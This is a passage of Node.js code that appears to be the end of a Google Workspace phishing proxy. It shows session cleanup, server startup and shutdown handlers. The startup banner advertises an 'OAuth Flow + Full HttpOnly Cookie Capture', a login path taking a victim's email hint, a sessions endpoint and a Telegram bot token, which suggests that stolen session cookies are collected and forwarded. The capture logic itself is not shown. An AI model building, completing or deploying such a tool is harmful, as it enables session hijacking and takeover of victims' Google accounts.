// ============================================================
//  CLEANUP SESSIONS (every 5 minutes)
// ============================================================

setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    for (const [id, session] of Object.entries(userSessions)) {
        if (now - session.timestamp > SESSION_TTL) {
            delete userSessions[id];
            cleaned++;
        }
    }
    if (cleaned > 0) {
        console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
    }
}, 5 * 60 * 1000);

// ============================================================
//  START SERVER
// ============================================================

server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.3                   ║');
    console.log('║        🔐  OAuth Flow + Full HttpOnly Cookie Capture     ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
    console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
    console.log(`║   🔗 Health:    ${PATHS.healthPath}                     ║`);
    console.log(`║   🔗 Sessions:  ${PATHS.sessionsPath}                   ║`);
    console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
    console.log(`║   📊 Active:    ${Object.keys(userSessions).length} sessions`);
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  GRACEFUL SHUTDOWN
// ============================================================

process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});